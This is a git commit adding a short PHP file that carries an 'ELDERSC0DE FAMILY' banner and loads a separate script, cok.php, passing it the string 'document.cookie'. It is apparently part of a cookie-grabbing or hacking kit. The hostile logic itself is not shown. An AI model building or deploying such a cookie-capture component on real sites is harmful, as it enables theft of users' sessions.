e733a6bb674e0b38e9389df67861c69134c6b8a9
Akhmad Yuza <akhmadyuza@gmail.com>
2019-05-11 22:37:44 +0700

    core

---
+++ setset.php
@@ -0,0 +1,9 @@
+<?php
+/**********************
+ * TELAH LULUS SENSOR
+ * ELDERSC0DE FAMILY
+ * 18:58 11/05/2019
+***********************/
+require_once("./cok.php");
+new enetget("document.cookie"); //GANTI DENGAN NAMA FILEMU ATAU BIARKAN DEFAULT
+?>
